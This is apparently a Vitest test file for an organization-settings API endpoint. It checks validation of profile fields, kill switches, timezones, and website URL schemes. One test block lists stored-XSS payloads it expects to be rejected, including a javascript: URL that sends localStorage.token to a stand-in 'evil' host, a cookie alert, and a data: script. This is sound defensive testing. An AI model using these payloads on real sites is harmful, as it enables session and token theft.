import { describe, it, expect, beforeEach, vi } from 'vitest';
import request from 'supertest';
import app from '../app';
import { prisma } from '../lib/prisma';
import { mockAuthAs, authHeader, ALPHA_ORG_ID } from './helpers';

beforeEach(() => {
  vi.clearAllMocks();
});

function mockOrgTx(current: Record<string, unknown> = {}) {
  (prisma.$transaction as any).mockImplementation((fn: any) =>
    fn({
      $executeRaw: vi.fn().mockResolvedValue(1),
      organization: {
        findUnique: vi.fn().mockResolvedValue({
          lead_first_issued_at: null,
          estimate_first_issued_at: null,
          job_first_issued_at: null,
          invoice_first_issued_at: null,
          customer_first_issued_at: null,
          lead_prefix: 'L',
          estimate_prefix: 'E',
          job_prefix: 'J',
          invoice_prefix: 'I',
          customer_prefix: 'C',
          number_padding: 5,
          stripe_account_id: null,
          accepted_payment_methods: [],
          ...current,
        }),
        update: vi.fn().mockImplementation((args: any) => Promise.resolve({ id: ALPHA_ORG_ID, ...args.data })),
      },
    }),
  );
}

describe('PATCH /api/organization — profile fields', () => {
  it('accepts and persists new profile fields', async () => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app)
      .patch('/api/organization')
      .set(authHeader('admin'))
      .send({
        display_name: 'Acme DBA',
        tax_id: '12-3456789',
        business_type: 'LLC',
        industry: ['HVAC', 'Plumbing'],
        support_email: 'support@acme.com',
        timezone: 'America/Chicago',
        currency: 'USD',
        date_format: 'MM/DD/YYYY',
        mfa_sms_enabled: true,
      });
    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ display_name: 'Acme DBA', mfa_sms_enabled: true });
  });

  it('accepts and persists email_sending_enabled=false (org-wide email kill switch)', async () => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app)
      .patch('/api/organization')
      .set(authHeader('admin'))
      .send({ email_sending_enabled: false });
    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ email_sending_enabled: false });
  });

  it('rejects a non-boolean email_sending_enabled', async () => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app)
      .patch('/api/organization')
      .set(authHeader('admin'))
      .send({ email_sending_enabled: 'nope' });
    expect(res.status).toBe(400);
  });

  it('accepts and persists sms_sending_enabled=false (org-wide SMS kill switch)', async () => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app)
      .patch('/api/organization')
      .set(authHeader('admin'))
      .send({ sms_sending_enabled: false });
    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ sms_sending_enabled: false });
  });

  it('rejects a non-boolean sms_sending_enabled', async () => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app)
      .patch('/api/organization')
      .set(authHeader('admin'))
      .send({ sms_sending_enabled: 'nope' });
    expect(res.status).toBe(400);
  });

  it('reveals mailing fields when mailing_same_as_hq=false', async () => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app)
      .patch('/api/organization')
      .set(authHeader('admin'))
      .send({
        mailing_same_as_hq: false,
        mailing_address_line1: 'PO Box 9',
        mailing_city: 'Austin',
        mailing_state: 'TX',
        mailing_postal_code: '78701',
        mailing_country: 'US',
      });
    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ mailing_same_as_hq: false, mailing_city: 'Austin' });
  });

  it('rejects unknown key (strict)', async () => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app).patch('/api/organization').set(authHeader('admin')).send({ nonsense: 1 });
    expect(res.status).toBe(400);
  });

  it('rejects bad support_email', async () => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app).patch('/api/organization').set(authHeader('admin')).send({ support_email: 'notanemail' });
    expect(res.status).toBe(400);
  });

  // #108 — clearing fixed-length code fields (they have non-empty defaults, so
  // clearing one makes it dirty + submitted). Empty string must not 400.
  it('allows clearing currency / country / mailing_country with empty strings', async () => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app)
      .patch('/api/organization')
      .set(authHeader('admin'))
      .send({ currency: '', country: '', mailing_country: '' });
    expect(res.status).toBe(200);
  });

  it('still rejects an invalid partial country code (1 char)', async () => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app)
      .patch('/api/organization')
      .set(authHeader('admin'))
      .send({ country: 'U' });
    expect(res.status).toBe(400);
    expect(res.body.details?.[0]?.field).toBe('country');
  });
});

// SECURITY (review #1): org.website renders into an <a href> on the PUBLIC estimate page.
// z.string().url() ACCEPTS javascript:/data:/vbscript: URLs (they parse as valid URLs), so the
// schema must additionally require an http(s) scheme to close the stored-XSS sink.
describe('PATCH /api/organization — website scheme (XSS hardening)', () => {
  it.each([
    'javascript:alert(document.cookie)',
    'javascript:fetch("//evil/?c="+localStorage.token)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
  ])('rejects a dangerous website scheme: %s', async (website) => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app).patch('/api/organization').set(authHeader('admin')).send({ website });
    expect(res.status).toBe(400);
    expect(res.body.details?.[0]?.field).toBe('website');
  });

  it('accepts a valid https website', async () => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app)
      .patch('/api/organization')
      .set(authHeader('admin'))
      .send({ website: 'https://acme-hvac.example.com' });
    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ website: 'https://acme-hvac.example.com' });
  });

  it('accepts clearing the website with an empty string', async () => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app).patch('/api/organization').set(authHeader('admin')).send({ website: '' });
    expect(res.status).toBe(200);
  });
});

// The org timezone is no longer decoration: every scheduled time in the product is now
// resolved and rendered against it. A value Intl cannot parse makes Intl.DateTimeFormat throw
// RangeError deep inside the render path, so it has to be rejected at the door rather than
// stored and blown up on later. `z.string().max(64)` accepted anything typed into the box.
describe('PATCH /api/organization — timezone must be a real IANA zone', () => {
  it.each([
    ['America/New_York'],
    ['America/Chicago'],
    ['America/Phoenix'],
    ['Pacific/Honolulu'],
  ])('accepts the valid IANA zone %s', async (timezone) => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app).patch('/api/organization').set(authHeader('admin')).send({ timezone });
    expect(res.status).toBe(200);
    expect(res.body).toMatchObject({ timezone });
  });

  it.each([
    ['Eastern'],          // a human name, not a zone
    ['America/Nowhere'],  // well-formed but not a real zone
    ['GMT-5'],            // an offset, which Intl rejects
    ['Not A Zone'],
  ])('rejects %s with 400', async (timezone) => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app).patch('/api/organization').set(authHeader('admin')).send({ timezone });
    expect(res.status).toBe(400);
    expect(res.body.details?.[0]?.field).toBe('timezone');
  });

  it('still allows an empty string, which means "unset"', async () => {
    mockAuthAs('admin');
    mockOrgTx();
    const res = await request(app).patch('/api/organization').set(authHeader('admin')).send({ timezone: '' });
    expect(res.status).toBe(200);
  });
});
